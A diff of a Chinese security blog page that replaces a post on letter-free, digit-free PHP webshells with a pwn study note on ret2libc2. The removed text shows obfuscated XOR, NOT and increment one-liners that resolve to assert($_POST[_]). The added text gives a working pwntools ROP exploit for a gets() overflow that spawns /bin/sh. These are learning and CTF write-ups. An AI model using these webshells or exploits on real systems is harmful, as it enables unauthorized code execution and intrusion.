@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>无数字和字母的webshell · yemoli&#39;s blog</title>
+    <title>pwn学习笔记-ret2libc2 · yemoli&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">yemoli&#39;s blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">无数字和字母的webshell</a>
+                <a href="#" class="post-name">pwn学习笔记-ret2libc2</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            无数字和字母的webshell
+            pwn学习笔记-ret2libc2
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class="post-intro-tags">
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="代码审计">代码审计</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">665</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">293</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/01/18</span>
+                    <span class="post-intro-time">2019/01/23</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,65 +401,65 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>先看一下这个例子</p>
-<pre><code>&lt;?php
-if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) {
-  eval($_GET[&apos;shell&apos;]);
-}
-</code></pre><p>这算是一个极限利用了，要求我们不用数字和字母构造webshell</p>
-<p>这样的问题我们可以类比于各类变形的一句话木马，用异或的方式得到一个新的字符，这时我们就可以用非数字和字母的字符串将数字或者字母异或出来</p>
-<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>例如这个</p>
-<pre><code>&lt;?php
-$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;;
-$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;
-$___=$$__;
-$_($___[_]); // assert($_POST[_]);
-</code></pre><p>部分数字是由于URL编码的原因，实际上是不包含数字的</p>
-<h2 id="取反运算"><a href="#取反运算" class="headerlink" title="取反运算"></a>取反运算</h2><p>还有一种方法我们可以使用~取反运算</p>
-<p>例如这个</p>
-<pre><code>&lt;?php
-$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);
-$_=$__/$__;
-$____=&apos;&apos;;
-$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});
+        <p>查看程序保护机制</p>
+<p><img src="https://i.imgur.com/NLQprf8.jpg" alt=""></p>
+<p>拖入ida查看</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+1Ch] [ebp-64h]
 
-$_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});
-$_=$$_____;
-$____($_[_]);// assert($_POST[_]);
-</code></pre><p>原理就是用UTF-8编码的汉字，将其中的某个字符取出，然后取反，就可以得到想要的字母</p>
-<h2 id="自增运算"><a href="#自增运算" class="headerlink" title="自增运算"></a>自增运算</h2><p>例如这个</p>
-<pre><code>&lt;?php
-@$_=[].&apos;&apos;;
-@$___=$_[&apos;&apos;];
-$_=$___;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
-$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
-$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;
-$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
-$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;
-$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
-$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;
-$____=&apos;_&apos;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
-$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;
-$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
-$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;
-$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
-$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;
-$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
-$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;
-@$___($_[_]);// assert($_POST[_]);
-?&gt;
-</code></pre><p>我们可以拿到一个为a的变量，通过自增操作，即可获得a-z的任意一个字符，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’,’c’++ =&gt; ‘d’</p>
-<p>而在PHP中，数组和字符串若强制连接的话，数组也就会转换成字符串，即array</p>
-<p>所以我们取字符串的第一个字母就可以得到a了</p>
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts(&quot;Something surprise here, but I don&apos;t think it will work.&quot;);
+  printf(&quot;What do you think ?&quot;);
+  gets(&amp;s);
+  return 0;
+}
+</code></pre><p>和ret2libc1一样，都是通过gets函数进行攻击</p>
+<p>查看程序是否存在system 函数</p>
+<pre><code>void secure()
+{
+  unsigned int v0; // eax
+  int input; // [esp+18h] [ebp-10h]
+  int secretcode; // [esp+1Ch] [ebp-Ch]
+
+  v0 = time(0);
+  srand(v0);
+  secretcode = rand();
+  __isoc99_scanf((const char *)&amp;unk_8048760, &amp;input);
+  if ( input == secretcode )
+system(&quot;no_shell_QQ&quot;);
+}
+</code></pre><p>寻找是否有/bin/sh字符串，但是该程序中并不存在</p>
+<p>这里就涉及到了最基本的ROP技术</p>
+<p>所以需要我们自己来读取字符串，我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)</p>
+<p>exp:</p>
+<pre><code>from pwn import *
+rop = ROP(&apos;./ret2libc2&apos;)
+
+p = process(&apos;./ret2libc2&apos;)
+
+elf = ELF(&apos;./ret2libc2&apos;)
+
+p.sendline(&apos;a&apos;*112+p32(elf.plt[&apos;gets&apos;])+p32(rop.search(8).address)+p32(elf.bss()+0x100)+p32(elf.plt[&apos;system&apos;])+&apos;aaaa&apos;+p32(elf.bss()+0x100))
+
+p.sendline(&apos;/bin/sh&apos;)
+
+p.interactive()
+</code></pre><p>其中</p>
+<pre><code>rop.search(8).address
+</code></pre><p>是pwntools自带寻找gadgets的方法</p>
+<p><img src="https://i.imgur.com/DZrEpJs.jpg" alt=""></p>
+<p>成功获得权限</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://yml-sec.top">夜莫离、</a>
-            </p><p>原文链接：<a href="https://yml-sec.top/2019/01/18/无数字和字母的webshell/">https://yml-sec.top/2019/01/18/无数字和字母的webshell/</a>
-            </p><p>发表日期：<a href="https://yml-sec.top/2019/01/18/无数字和字母的webshell/">January 18th 2019, 10:30:45 pm</a>
-            </p><p>更新日期：<a href="https://yml-sec.top/2019/01/18/无数字和字母的webshell/">January 18th 2019, 10:53:13 pm</a>
+            </p><p>原文链接：<a href="https://yml-sec.top/2019/01/23/pwn学习笔记-ret2libc2/">https://yml-sec.top/2019/01/23/pwn学习笔记-ret2libc2/</a>
+            </p><p>发表日期：<a href="https://yml-sec.top/2019/01/23/pwn学习笔记-ret2libc2/">January 23rd 2019, 8:16:08 pm</a>
+            </p><p>更新日期：<a href="https://yml-sec.top/2019/01/23/pwn学习笔记-ret2libc2/">January 23rd 2019, 8:30:27 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -467,17 +467,12 @@ $__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2019/01/19/ARP欺骗原理及实例/" title="ARP欺骗原理及实例">
-                    <div class="nextTitle">ARP欺骗原理及实例</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/01/17/命令执行漏洞小结/" title="命令执行漏洞小结">
-                    <div class="prevTitle">命令执行漏洞小结</div>
+                <a href="/2019/01/22/pwn学习笔记-ret2libc1/" title="pwn学习笔记-ret2libc1">
+                    <div class="prevTitle">pwn学习笔记-ret2libc1</div>
                 </a>
             
         </li>
@@ -596,7 +591,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#异或"><span class="toc-number">1.</span> <span class="toc-text">异或</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#取反运算"><span class="toc-number">2.</span> <span class="toc-text">取反运算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#自增运算"><span class="toc-number">3.</span> <span class="toc-text">自增运算</span></a></li></ol>
+        
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
